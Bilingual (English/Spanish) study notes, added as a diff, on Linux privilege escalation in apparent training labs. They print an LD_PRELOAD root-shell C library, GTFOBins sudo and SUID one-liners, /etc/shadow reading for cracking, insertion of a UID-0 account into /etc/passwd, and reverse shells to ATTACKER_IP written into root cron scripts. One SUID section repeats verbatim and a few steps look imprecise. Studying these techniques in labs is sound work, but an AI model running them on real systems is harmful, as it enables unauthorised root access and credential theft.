@@ -180,3 +180,427 @@ Si el exploit es exitoso, obtendremos acceso como usuario root.
   
 ---
 
+# Privilege Escalation: Sudo
+
+# Privilege Escalation in Linux
+
+## Using sudo
+The `sudo` command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.
+
+Any user can check its current situation related to root privileges using the `sudo -l` command.
+
+[GTFOBins](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.
+
+## Leverage application functions
+Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.
+
+In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).
+
+Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.
+
+## Leverage LD_PRELOAD
+On some systems, you may see the `LD_PRELOAD` environment option.
+
+`LD_PRELOAD` is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of `LD_PRELOAD`. If the `env_keep` option is enabled, we can generate a shared library which will be loaded and executed before the program is run. Please note the `LD_PRELOAD` option will be ignored if the real user ID is different from the effective user ID.
+
+The steps of this privilege escalation vector can be summarized as follows:
+
+1. Check for `LD_PRELOAD` (with the `env_keep` option)
+2. Write a simple C code compiled as a shared object (`.so` extension) file
+3. Run the program with sudo rights and the `LD_PRELOAD` option pointing to our `.so` file
+
+The C code will simply spawn a root shell and can be written as follows:
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+We can save this code as `shell.c` and compile it using `gcc` into a shared object file using the following parameters:
+
+```bash
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+
+We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, `find`, or almost any of the programs we can run with sudo can be used.
+
+We need to run the program by specifying the `LD_PRELOAD` option, as follows:
+
+```bash
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+```
+
+This will result in a shell spawn with root privileges.
+
+
+# Privilege Escalation in Linux Sudo
+
+## Enumerating sudo Permissions
+To identify possible privilege escalation vectors, we start by checking the `sudo` privileges of the current user:
+
+```bash
+sudo -l
+```
+
+### Example Output:
+```bash
+karen@ip-10-10-230-150:/$ sudo -l
+Matching Defaults entries for karen on ip-10-10-230-150:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User karen may run the following commands on ip-10-10-230-150:
+    (ALL) NOPASSWD: /usr/bin/find
+    (ALL) NOPASSWD: /usr/bin/less
+    (ALL) NOPASSWD: /usr/bin/nano
+```
+
+Since `find`, `less`, and `nano` are available with `NOPASSWD`, we check [GTFOBins](https://gtfobins.github.io/) for ways to escalate privileges using these binaries.
+
+## Exploiting `find`
+Using `find`, we can escalate privileges with the following command:
+
+```bash
+sudo find . -exec /bin/sh \; -quit
+```
+
+This will grant us a root shell.
+
+## Exploiting `nmap`
+If `nmap` were available with sudo privileges, we could escalate privileges using its interactive mode:
+
+```bash
+sudo nmap --interactive
+```
+
+Once inside, we run:
+
+```bash
+!sh
+```
+
+This will drop us into a root shell.
+
+## Searching for Passwords
+To check for stored passwords in `/etc/shadow`, we use:
+
+```bash
+sudo cat /etc/shadow | grep <username>
+```
+
+Replacing `<username>` with the target username if known.
+
+---
+
+# Linux Privilege Escalation using SUID
+
+Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with **SUID (Set-user Identification)** and **SGID (Set-group Identification)**. These allow files to be executed with the permission level of the file owner or the group owner, respectively.
+
+You will notice these files have an **“s”** bit set showing their special permission level.
+
+## Finding SUID Binaries
+To list files that have the SUID bit set, use the following command:
+
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+A good practice would be to compare executables on this list with **GTFOBins** ([GTFOBins](https://gtfobins.github.io)). Clicking on the **SUID** button will filter binaries known to be exploitable when the SUID bit is set ([Pre-filtered List](https://gtfobins.github.io/#+suid)).
+
+## Exploiting SUID on `nano`
+The list above shows that `nano` has the SUID bit set. Unfortunately, GTFOBins does not provide an easy exploitation method. In real-life privilege escalation scenarios, intermediate steps are often needed to leverage whatever small findings are available.
+
+### Reading the `/etc/shadow` File
+Since `nano` has the SUID bit set and is owned by `root`, we can use it to read and edit files at a higher privilege level than our current user. Two possible privilege escalation methods are:
+
+#### 1. Read `/etc/shadow` and Crack Passwords
+
+```bash
+nano /etc/shadow
+```
+
+This will print the contents of the `/etc/shadow` file. We can then use the `unshadow` tool to create a crackable file for **John the Ripper**.
+
+```bash
+unshadow passwd.txt shadow.txt > passwords.txt
+```
+
+Using a correct wordlist and some luck, **John the Ripper** can return one or several passwords in cleartext. More details about **John the Ripper** can be found here: [John The Ripper](https://tryhackme.com/room/johntheripper0).
+
+#### 2. Add a New Root User
+Instead of cracking passwords, we can **add a new user with root privileges** to bypass the process.
+
+##### Generate a Password Hash
+
+```bash
+openssl passwd -1 -salt my_salt mypassword
+```
+
+This will generate a hash value for the password we want to set for the new user.
+
+##### Edit `/etc/passwd` to Add the New User
+Open `/etc/passwd` using `nano`:
+
+```bash
+nano /etc/passwd
+```
+
+Add the following line:
+
+```plaintext
+newroot:x:0:0::/root:/bin/bash
+```
+
+This will create a user `newroot` with UID 0 (root privileges).
+
+##### Switch to the New User
+
+```bash
+su newroot
+```
+
+If everything was done correctly, we should now have root privileges.
+
+
+# 🔐 Ejercicio SUID
+
+## 🚀 Acceso y recopilación de información
+
+Accedemos al sistema mediante **SSH** y recopilamos información básica del sistema:
+
+```bash
+uname -a
+```
+
+## 🔎 Identificación de binarios con permisos SUID
+
+Buscamos archivos con el bit **SUID** activado:
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+## 📌 Identificación de binarios vulnerables
+
+Consultamos la página de [GTFOBins](https://gtfobins.github.io/) para identificar comandos con SUID que puedan explotarse.
+
+---
+
+### 🛠 Caso de estudio: `base64`
+
+Si encontramos `base64` con SUID, revisamos en **GTFOBins** los comandos sugeridos para explotarlo. Ejecutamos:
+
+```bash
+echo "id" | base64 | base64 -d | sh
+```
+
+✅ Esto nos permite ejecutar comandos como **root** si `base64` tiene el bit **SUID** activado.
+
+---
+
+# Linux Privilege Escalation using SUID and Cron Jobs
+
+Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with **SUID (Set-user Identification)** and **SGID (Set-group Identification)**. These allow files to be executed with the permission level of the file owner or the group owner, respectively.
+
+You will notice these files have an **“s”** bit set showing their special permission level.
+
+## Finding SUID Binaries
+To list files that have the SUID bit set, use the following command:
+
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+A good practice would be to compare executables on this list with **GTFOBins** ([GTFOBins](https://gtfobins.github.io)). Clicking on the **SUID** button will filter binaries known to be exploitable when the SUID bit is set ([Pre-filtered List](https://gtfobins.github.io/#+suid)).
+
+## Exploiting SUID on `nano`
+The list above shows that `nano` has the SUID bit set. Unfortunately, GTFOBins does not provide an easy exploitation method. In real-life privilege escalation scenarios, intermediate steps are often needed to leverage whatever small findings are available.
+
+### Reading the `/etc/shadow` File
+Since `nano` has the SUID bit set and is owned by `root`, we can use it to read and edit files at a higher privilege level than our current user. Two possible privilege escalation methods are:
+
+#### 1. Read `/etc/shadow` and Crack Passwords
+
+```bash
+nano /etc/shadow
+```
+
+This will print the contents of the `/etc/shadow` file. We can then use the `unshadow` tool to create a crackable file for **John the Ripper**.
+
+```bash
+unshadow passwd.txt shadow.txt > passwords.txt
+```
+
+Using a correct wordlist and some luck, **John the Ripper** can return one or several passwords in cleartext. More details about **John the Ripper** can be found here: [John The Ripper](https://tryhackme.com/room/johntheripper0).
+
+#### 2. Add a New Root User
+Instead of cracking passwords, we can **add a new user with root privileges** to bypass the process.
+
+##### Generate a Password Hash
+
+```bash
+openssl passwd -1 -salt my_salt mypassword
+```
+
+This will generate a hash value for the password we want to set for the new user.
+
+##### Edit `/etc/passwd` to Add the New User
+Open `/etc/passwd` using `nano`:
+
+```bash
+nano /etc/passwd
+```
+
+Add the following line:
+
+```plaintext
+newroot:x:0:0::/root:/bin/bash
+```
+
+This will create a user `newroot` with UID 0 (root privileges).
+
+##### Switch to the New User
+
+```bash
+su newroot
+```
+
+If everything was done correctly, we should now have root privileges.
+
+---
+
+## Privilege Escalation Using Cron Jobs
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
+
+The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
+
+### Finding and Exploiting Cron Jobs
+Cron job configurations are stored as **crontabs (cron tables)**. Each user on the system has their crontab file and can run specific tasks whether they are logged in or not. Our goal is to find a **cron job set by root** and have it execute our script, ideally a shell.
+
+#### Viewing System-Wide Cron Jobs
+Any user can read the file keeping system-wide cron jobs:
+
+```bash
+cat /etc/crontab
+```
+
+#### Modifying a Vulnerable Cron Job
+If a scheduled script, such as `backup.sh`, runs every minute and is writable by our user, we can modify it to execute a **reverse shell**:
+
+```bash
+echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /path/to/backup.sh
+```
+
+Start a listener on the attacking machine to catch the reverse shell:
+
+```bash
+nc -lvnp 4444
+```
+
+#### Exploiting Orphaned Cron Jobs
+A common misconfiguration occurs when administrators **delete a script but forget to remove the cron job**. If the full path of the script is not defined, cron will search for it in the directories listed under the `PATH` variable in `/etc/crontab`. If we create a script named **antivirus.sh** under our home directory, the cron job will execute it:
+
+```bash
+echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > ~/antivirus.sh
+chmod +x ~/antivirus.sh
+```
+
+If successful, the reverse shell connection will have **root privileges**.
+
+---
+
+## Conclusion
+Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. If you find an existing script or task attached to a cron job, spend time understanding its function and how tools like `tar`, `7z`, or `rsync` may be exploited using wildcard features.
+
+Now it's your turn to use the skills you were just taught to find a vulnerable binary or cron job that can be exploited.
+
+# ⏳ Ejercicio Cron Jobs
+
+## 🔍 Análisis Inicial
+
+Comenzamos obteniendo información del sistema:
+
+```bash
+uname -a
+```
+
+También podemos usar herramientas como **linpeas** para automatizar el proceso de análisis.
+
+---
+
+## 📆 Identificar Tareas Programadas
+
+Localizamos las tareas programadas revisando el archivo **/etc/crontab**:
+
+```bash
+cat /etc/crontab
+```
+
+Si encontramos un archivo **backup.sh** que se ejecuta como **root** y tenemos permisos para modificarlo dentro del usuario *karen*, podemos aprovecharlo.
+
+---
+
+## 🛠 Explotación
+
+1. **Editamos el script** y le damos permisos de ejecución:
+
+   ```bash
+   echo "bash -i >& /dev/tcp/TU_IP/8888 0>&1" >> /ruta/a/backup.sh
+   chmod +x /ruta/a/backup.sh
+   ```
+
+2. **Iniciamos un listener en nuestra máquina:**
+
+   ```bash
+   nc -lvnp 8888
+   ```
+
+3. **Esperamos a que se ejecute la tarea programada.** Cuando el cron job se ejecute, obtendremos acceso como **root** en el sistema.
+
+---
+
+## Privilege Escalation Using Capabilities
+
+System administrators can use "Capabilities" to increase the privilege level of a process or binary at a more granular level. This allows specific privileges to be granted without giving full higher privileges to a user.
+
+### Example Use Case
+If a SOC analyst needs to use a tool that initiates socket connections, a regular user would not have the necessary permissions. Instead of granting full administrative privileges, the system administrator can modify the capabilities of the binary, allowing it to complete its task without needing a higher privilege user.
+
+### Listing Enabled Capabilities
+We can use the `getcap` tool to check the capabilities set on files.
+
+```bash
+getcap -r /
+```
+
+When run as an unprivileged user, the above command will generate many errors. It is best practice to redirect error messages to `/dev/null`:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+### Capabilities and SUID
+Unlike SUID-based privilege escalation, capabilities do not require the SUID bit to be set. This means that traditional enumeration techniques looking for SUID binaries will not reveal capabilities-based privilege escalation vectors.
+
+### Exploiting Capabilities for Privilege Escalation
+GTFObins provides a comprehensive list of binaries that can be used for privilege escalation if they have set capabilities.
+
+#### Example: Escalating Privileges Using `vim`
+If we find that `vim` has specific capabilities set, we can leverage it to spawn a root shell with the following command:
+
+```bash
+vim -c ':!sh'
+```
+
+This command will launch a root shell, allowing privilege escalation.
+
+Ejercicio
+
+---
